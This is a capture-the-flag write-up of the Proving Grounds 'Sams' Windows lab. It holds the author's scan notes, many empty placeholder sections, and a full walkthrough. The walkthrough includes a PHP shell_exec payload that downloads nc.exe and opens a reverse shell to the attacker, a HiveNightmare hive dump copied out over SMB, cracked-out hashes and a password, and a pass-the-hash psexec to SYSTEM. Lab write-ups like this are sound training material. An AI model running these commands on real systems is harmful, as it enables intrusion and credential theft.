---
title: Sams
parent: Proving Grounds Play
grand_parent: Writeups
nav_order: 4
---
# Sams
## Windows
## Easy

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sams]
└─$ nmap -Pn -p- -sCV -A -oN full_scan.txt -open 192.168.201.248
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 00:21 +0900
Nmap scan report for 192.168.201.248
Host is up (0.096s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/7.3.29)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Sam Elliot | Web Designer
443/tcp  open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/7.3.29)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Sam Elliot | Web Designer
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 22H2 (92%), Microsoft Windows 10 1909 - 2004 (85%), Microsoft Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-11T15:25:14
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   96.93 ms 192.168.45.1
2   96.95 ms 192.168.45.254
3   97.00 ms 192.168.251.1
4   96.95 ms 192.168.201.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 233.64 seconds
```
- 80
- 443
- 445
- 3306
- 7680

## HTTP/HTTPS

### 80

![](../../../assets/images/Pasted%20image%2020260512003701.png)

![](../../../assets/images/Pasted%20image%2020260512003742.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec]
└─$ ffuf -u http://192.168.201.248/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 403,404 -c -e .php,.html,.txt,.conf,.xml,.json,.log,old,zip,.sql -r 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.201.248/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .html .txt .conf .xml .json .log old zip .sql 
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response status: 403,404
________________________________________________

                        [Status: 200, Size: 17938, Words: 7556, Lines: 476, Duration: 113ms]
index.html              [Status: 200, Size: 17938, Words: 7556, Lines: 476, Duration: 97ms]
Index.html              [Status: 200, Size: 17938, Words: 7556, Lines: 476, Duration: 99ms]
index.html              [Status: 200, Size: 17938, Words: 7556, Lines: 476, Duration: 96ms]
testing                 [Status: 200, Size: 70, Words: 9, Lines: 1, Duration: 138ms]
vendor                  [Status: 200, Size: 1199, Words: 114, Lines: 18, Duration: 115ms]
:: Progress: [50754/50754] :: Job [1/1] :: 420 req/sec :: Duration: [0:02:06] :: Errors: 1 ::
```
- index.html
- testing
- vender

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sams]
└─$ wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -t 60 --hw 9 --hc 403,404 http://192.168.201.248/testing/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.201.248/testing/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000002058:   301        9 L      30 W       353 Ch      "install"                                          
000003436:   200        0 L      2 W        12 Ch       "robots.txt"                                       
000003944:   301        9 L      30 W       352 Ch      "system"                                           
000004364:   301        9 L      30 W       349 Ch      "web"                                              
000004365:   200        74 L     219 W      5091 Ch     "web.config"                                       

Total time: 9.939337
Processed Requests: 4614
Filtered Requests: 4609
Requests/sec.: 464.2160
```
- install
- robots.txt
- system
- web
- webconfig

![](../../../assets/images/Pasted%20image%2020260512004241.png)

![](../../../assets/images/Pasted%20image%2020260512004547.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sams]
└─$ whatweb -a 3 http://192.168.201.248
http://192.168.201.248 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29], IP[192.168.201.248], JQuery, Lightbox, OpenSSL[1.1.1k], PHP[7.3.29], Script, Title[Sam Elliot | Web Designer]
```

![](../../../assets/images/Pasted%20image%2020260512060310.png)

### Changelog

```zsh
- January 11, 2021
    - v2.2.6
    - Errata #6: Fixed upgrader error for PHP8, minor PHP8 fixes (users class)
    - Errata #5: Fixed cmsCurl response type, fixed gallery save function, added information about view template files (*.template.php) in Help - About page for each application/block/macro
    - Errata #4: Fixed menu drag and drop, corrected email setup UI, bootstrap slideshow next/prev, fixed refresh datatable function
    - Errata #3: More PHP8 compatibility fixes, UI enhancements (added some colours to tabs, changed default font to Roboto)
    - Errata #2: Updated Bootstrap to v4.6.0, more PHP8 compatibility fixes
    - Fixed - initial PHP 8.0 compatibility
    - Updated - PHPMailer 6.1.7 to 6.2.0 for PHP 8.0 compatibility
    - New (for developers) - fcookie_*, fsession_* methods (just like
```


### 443

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sams]
└─$ whatweb -a 3 https://192.168.201.248
https://192.168.201.248 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29], IP[192.168.201.248], JQuery, Lightbox, OpenSSL[1.1.1k], PHP[7.3.29], Script, Title[Sam Elliot | Web Designer]
```


### 445

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sams]
└─$ smbclient -L //192.168.201.248
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sams]
└─$ enum4linux -a 192.168.201.248                        
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 12 00:49:18 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.201.248
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==========================( Enumerating Workgroup/Domain on 192.168.201.248 )==========================


[E] Can't find workgroup/domain



 ==============================( Nbtstat Information for 192.168.201.248 )==============================

Looking up status of 192.168.201.248
No reply from 192.168.201.248

 ==================================( Session Check on 192.168.201.248 )==================================


[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

---

# Initial Access

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

<details markdown=1>

# Walkthrough

Sams Walkthrough

Summary:
```
In this guide we will exploit an authenticated remote code execution vulnerability in SCHLIX CMS version 2.2.6-6 to establish our initial foothold. We will escalate privileges using the HiveNightmare vulnerability.
```

Enumeration
We begin the enumeration process with an nmap scan.

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ nmap -sC -sV -oN scan.txt 192.168.245.156 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 13:48 EDT
Nmap scan report for 192.168.245.156
Host is up (0.00071s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/7.3.29)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29
|_http-title: Sam Elliot | Web Designer
443/tcp  open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/7.3.29)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29
|_http-title: Sam Elliot | Web Designer
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL 5.5.5-10.4.20-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.20-MariaDB
|   Thread ID: 12
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, LongColumnFlag, ODBCClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, InteractiveClient, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsLoadDataLocal, FoundRows, IgnoreSigpipes, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: &>E#xZ9KN%kng;.sz+c4
|_  Auth Plugin Name: mysql_native_password

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-28T17:48:31
|_  start_date: N/A
```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.50 seconds
We see that ports 80 (http), 443 (https), 445 (smb) and 3306 (mysql) are open and running on the target.

Starting with port 80, we see a static site running on http://192.168.245.156/

Turning our attention to content discovery we use ffuf to bruteforce directories and discover a /testing directory.

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.245.156/FUZZ -t 500 -fc 403,404          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.245.156/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403,404
________________________________________________

assets                  [Status: 301, Size: 344, Words: 22, Lines: 10]
index.html              [Status: 200, Size: 18833, Words: 8162, Lines: 511]
testing                 [Status: 301, Size: 345, Words: 22, Lines: 10]
vendor                  [Status: 301, Size: 344, Words: 22, Lines: 10]
:: Progress: [4686/4686] :: Job [1/1] :: 3642 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

We see that Schlix CMS is running on http://192.168.245.156/testing/.

Further directory bruteforcing reveals /testing/admin

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.245.156/testing/FUZZ -fs 3846 -fc 404,403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.245.156/testing/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 3846
 :: Filter           : Response status: 404,403
________________________________________________

admin                   [Status: 200, Size: 5276, Words: 628, Lines: 79]
REDACTED...
```

# Exploitation
Navigating to http://192.168.245.156/testing/admin/, we are redirected to a login page.

Since both the site's title and directory are "testing" we will attempt to enter "testing" as the password.

Login with username admin and password testing.

We receive the following prompt:

Warning! Installation directory /install still exists and can be used to override your current CMS. Please remove it before continuing

Click on "remove it before continuing" -> "OK" ->

Navigating to the System Info section reveals SCHLIX CMS version 2.2.6-6.

We proceed by searching for exploits using searchsploit.

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ searchsploit schlix cms
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Schlix CMS 2.2.6-6 - 'title' Persistent Cross-Site Scripting (Authenticated)                                                           | multiple/webapps/49837.txt
Schlix CMS 2.2.6-6 - Arbitary File Upload And Directory Traversal Leads To RCE (Authenticated)                                         | multiple/webapps/49897.txt
Schlix CMS 2.2.6-6 - Remote Code Execution (Authenticated)                                                                             | multiple/webapps/49838.txt
```
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
From the output we see that SCHLIX CMS version 2.2.6-6 is vulnerable to an authenticated remote code execution vulnerability.

We mirror the exploit to our attack machine.

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ searchsploit -m 49838  
  Exploit: Schlix CMS 2.2.6-6 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49838
     Path: /usr/share/exploitdb/exploits/multiple/webapps/49838.txt
File Type: UTF-8 Unicode text, with very long lines, with CRLF line terminators

Copied to: /home/kali/Sams_test/49838.txt
```

Following the exploit we clone https://github.com/calip/app_mailchimp to our machine.

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ git clone https://github.com/calip/app_mailchimp
Cloning into 'app_mailchimp'...
remote: Enumerating objects: 30, done.
remote: Counting objects: 100% (30/30), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 30 (delta 7), reused 27 (delta 7), pack-reused 0
Receiving objects: 100% (30/30), 31.68 KiB | 853.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.
Now we append the following code to packageinfo.inc.php in app_mailchimp/mailchimp/blocks/mailchimp.
```

```
$command = shell_exec('mkdir c:\pwn && powershell.exe wget "http://192.168.245.153/nc.exe" -outfile "c:\pwn\nc.exe" && c:\pwn\nc.exe -e cmd.exe 192.168.245.153 1411');
echo "<pre>$command</pre>";

?>
```

Next we compress the mailchimp folder in app_mailchimp with name combo_mailchimp-1_0_1.zip

```zsh
┌──(kali㉿kali)-[~/Sams_test/app_mailchimp]
└─$ zip -r combo_mailchimp-1_0_1.zip mailchimp/
  adding: mailchimp/ (stored 0%)
  adding: mailchimp/blocks/ (stored 0%)
  adding: mailchimp/blocks/mailchimp/ (stored 0%)
  adding: mailchimp/blocks/mailchimp/view.block.template.php (deflated 44%)
  adding: mailchimp/blocks/mailchimp/mailchimp_logo.png (deflated 1%)
  adding: mailchimp/blocks/mailchimp/config.template.php (deflated 73%)
  adding: mailchimp/blocks/mailchimp/packageinfo.inc.php (deflated 39%)
  adding: mailchimp/blocks/mailchimp/mailchimp.class.php (deflated 42%)
  adding: mailchimp/apps/ (stored 0%)
  adding: mailchimp/apps/mailchimp/ (stored 0%)
  adding: mailchimp/apps/mailchimp/edit.item.template.php (deflated 70%)
  adding: mailchimp/apps/mailchimp/mailchimp.admin.js (deflated 68%)
  adding: mailchimp/apps/mailchimp/mailchimp.js (deflated 69%)
  adding: mailchimp/apps/mailchimp/view.item.template.php (deflated 60%)
  adding: mailchimp/apps/mailchimp/edit.category.template.php (deflated 69%)
  adding: mailchimp/apps/mailchimp/view.category.simple.template.php (deflated 77%)
  adding: mailchimp/apps/mailchimp/mailchimp_logo.png (deflated 1%)
  adding: mailchimp/apps/mailchimp/config.template.php (deflated 70%)
  adding: mailchimp/apps/mailchimp/packageinfo.inc.php (deflated 38%)
  adding: mailchimp/apps/mailchimp/uninstall.sql (deflated 35%)
  adding: mailchimp/apps/mailchimp/mailchimp.css (stored 0%)
  adding: mailchimp/apps/mailchimp/mailchimp.admin.class.php (deflated 58%)
  adding: mailchimp/apps/mailchimp/mailchimp.class.php (deflated 72%)
  adding: mailchimp/apps/mailchimp/view.main.admin.template.php (deflated 66%)
  adding: mailchimp/apps/mailchimp/view.main.template.php (deflated 71%)
  adding: mailchimp/apps/mailchimp/install.sql (deflated 82%)
```

We copy nc.exe to our current working directory.

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ sudo cp /usr/share/windows-binaries/nc.exe .
[sudo] password for kali:
```

We host nc.exe using python's web server

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ pysrv
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, we start a listener on our attack machine.

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ sudo nc -nlvp 1411      
[sudo] password for kali: 
listening on [any] 1411 ...
```
We navigate to block manager: http://192.168.245.156/testing/admin/app/core.blockmanager

"New Category" -> pwn

Navigate to "pwn"

"Install a package" -> upload combo_mailchimp-1_0_1.zip -> Enter password "testing" -> "Go"

Now we open the newly uploaded "mailchimp" block

http://192.168.245.156/testing/admin/app/core.blockmanager?action=edititem&id=36

We receive a reponse in our listener as the sam user.

```
└─$ sudo nc -nlvp 1411      
[sudo] password for kali: 
listening on [any] 1411 ...
connect to [192.168.245.153] from (UNKNOWN) [192.168.245.156] 50404
Microsoft Windows [Version 10.0.19043.1110]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\testing>whoami
whoami
sams-pc\sam

C:\xampp\htdocs\testing>

Escalation
We begin by spawning powershell and checking the windows version.

C:\>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\> [System.Environment]::OSVersion.Version
[System.Environment]::OSVersion.Version
```

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      19043  0
This version of windows might be vulnerable to SeriousSAM a.k.a HiveNightmare vulnerability.

We download the exploit binary to our attack machine.

```
┌──(kali㉿kali)-[~/Sams_test]
└─$ wget https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe
```
Host binary using python's web server

```
┌──(kali㉿kali)-[~/Sams_test]
└─$ pysrv
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Now we download HiveNightmare.exe to our target machine.

```powershell
PS C:\> wget "http://192.168.245.153/HiveNightmare.exe" -outfile "c:\pwn\HiveNightmare.exe"
wget "http://192.168.245.153/HiveNightmare.exe" -outfile "c:\pwn\HiveNightmare.exe"
PS C:\> cd pwn
cd pwn
PS C:\pwn> dir
dir


    Directory: C:\pwn


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/28/2021  11:51 PM         227328 HiveNightmare.exe                                                    
-a----         7/28/2021  11:44 PM          59392 nc.exe
```
Now we execute HiveNightmare.exe

PS C:\pwn> ./HiveNightmare.exe
./HiveNightmare.exe

HiveNightmare v0.6 - dump registry hives as non-admin users

Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

Running...

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM

Success: SAM hive from 2021-07-28 written out to current working directory as SAM-2021-07-28

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SECURITY

Success: SECURITY hive from 2021-07-28 written out to current working directory as SECURITY-2021-07-28

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM

Success: SYSTEM hive from 2021-07-28 written out to current working directory as SYSTEM-2021-07-28


Assuming no errors above, you should be able to find hive dump files in current working directory.
We start smbserver.py on our attack machine.

┌──(kali㉿kali)-[~/Sams_test]
└─$ sudo python3 /home/kali/Public/Tools/impacket/examples/smbserver.py test /home/kali/Sams_test -username test -password test -smb2support
[sudo] password for kali: 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
Copy SAM, SECURITY and SYSTEM files to our attack machine via smb.

PS C:\pwn> net use \\192.168.245.153\test test /user:test
net use \\192.168.245.153\test test /user:test
The command completed successfully.

PS C:\pwn> copy SAM-2021-07-28 \\192.168.245.153\test
copy SAM-2021-07-28 \\192.168.245.153\test
PS C:\pwn> copy SECURITY-2021-07-28 \\192.168.245.153\test
copy SECURITY-2021-07-28 \\192.168.245.153\test
PS C:\pwn> copy SYSTEM-2021-07-28 \\192.168.245.153\test
copy SYSTEM-2021-07-28 \\192.168.245.153\test
PS C:\pwn>
We extract hashes using secretsdump.py

┌──(kali㉿kali)-[~/Sams_test]
└─$ python3 /home/kali/Public/Tools/impacket/examples/secretsdump.py -sam SAM-2021-07-28 -security SECURITY-2021-07-28 -system SYSTEM-2021-07-28 LOCAL              1 ⨯
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xd204b55fa42b3ca739e7285303d53b60
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0912e49206267ee2d62eb06cab756d48:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0b8b402babb6b59a88cc0422bac7494b:::
sam:1001:aad3b435b51404eeaad3b435b51404ee:72482fd146b3389f679b785b9134c159:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):SamElliot11
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb0a66e24075194213dd5b849395fae15a8883e3d
dpapi_userkey:0x6e01ae9a04fbb8cf07659a1016826d6709eff3d9
[*] NL$KM 
 0000   05 04 26 52 93 43 7C 10  98 7B FC 91 D8 D4 65 11   ..&R.C|..{....e.
 0010   1E 34 C5 43 7B C8 41 16  8F DA 8A 8E FE C2 74 F8   .4.C{.A.......t.
 0020   96 0C DF D9 1A 76 92 44  BB C7 39 A5 DC 5A C9 B8   .....v.D..9..Z..
 0030   77 09 17 01 D8 65 4A A6  0E CB F7 73 A0 49 60 72   w....eJ....s.I`r
NL$KM:0504265293437c10987bfc91d8d465111e34c5437bc841168fda8a8efec274f8960cdfd91a769244bbc739a5dc5ac9b877091701d8654aa60ecbf773a0496072
[*] Cleaning up...
Finally, we use psexec.py to pass the administrator's hash and spawn cmd.exe

```zsh
┌──(kali㉿kali)-[~/Sams_test]
└─$ python3 /home/kali/Public/Tools/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0912e49206267ee2d62eb06cab756d48 administrator@192.168.245.156 cmd.exe
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.245.156.....
[*] Found writable share ADMIN$
[*] Uploading file oSrBMTZx.exe
[*] Opening SVCManager on 192.168.245.156.....
[*] Creating service FTXm on 192.168.245.156.....
[*] Starting service FTXm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19043.1110]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

C:\WINDOWS\system32>

</details>